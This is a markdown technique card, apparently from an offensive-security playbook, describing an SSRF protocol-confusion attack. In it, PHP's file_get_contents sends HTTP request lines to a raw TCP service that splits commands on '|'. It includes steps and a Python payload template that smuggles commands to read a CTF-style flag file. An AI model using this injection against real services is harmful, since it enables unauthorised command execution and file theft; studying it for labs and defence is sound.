---
name: http_to_tcp_protocol_confusion
vuln_type: ssrf
sub_technique: protocol_confusion
category: exploitation
safety_level: safe
tags:
- protocol-confusion
- http
- tcp
- ssrf
- file_get_contents
---

# Http-To-Tcp Protocol Confusion — File Get Contents(Http://) To Raw Tcp Service

## When to Apply

When PHP's file_get_contents('http://host:port/path') connects to a raw TCP service (non-HTTP), the HTTP request line and headers are interpreted as commands by the TCP protocol. GET /path HTTP/1.0 itself becomes input to the custom protocol.

## Prerequisites

- PHP file_get_contents + http:// stream wrapper in use
- Target is a raw TCP service (e.g. memstorage on port 9091)
- TCP service's parseCommand (partially) processes the HTTP request line
- Strictness of parsing raw TCP response as HTTP varies by PHP version

## Steps

1. Induce debug action to request `http://api:9091/` URL via file_get_contents
2. Actual data PHP sends:
   ```
   GET /CMD1|CMD2|CMD3 HTTP/1.0\r\n
   Host: api:9091\r\n
   \r\n
   ```
3. memstorage parseCommand splits `GET /CMD1|CMD2|CMD3`:
   - `GET /CMD1` (invalid → skip)
   - `CMD2` (valid command executed)
   - `CMD3` (valid command executed)
4. However, PHP's HTTP stream wrapper expects the first line of the response to be an HTTP status line — raw TCP responses usually fail. May be bypassable with ignore_errors depending on PHP version.
5. Bypass strategy: use fsockopen for direct TCP communication from PHP, or trick memstorage response into starting with an HTTP/1.x-like first line.

## Code Template

```
# Pass raw TCP service URL to PHP debug action
import urllib.parse
cmd_payload = 'AUTH_S 0d0a0d0a ' + 'file:///flag.txt'.encode().hex() + '|BYE'
debug_url = f'http://api:9091/{urllib.parse.quote(cmd_payload, safe="")}'
# memstorage.php?action=debug&url=<debug_url>
# PHP sends: GET /<cmd_payload> HTTP/1.0\r\nHost: api:9091\r\n\r\n
# memstorage splits on | and executes AUTH_S and BYE
```

## Examples

### Example 1

- **php_function**: file_get_contents with http:// wrapper
- **target_service**: custom TCP service on non-HTTP port
- **http_request_as_command**: GET /payload HTTP/1.0 → parseCommand splits on |

In PHP 8.2+, file_get_contents may fail when trying to parse raw TCP responses as HTTP headers. Direct TCP via fsockopen succeeds. file_get_contents may also work depending on PHP version.
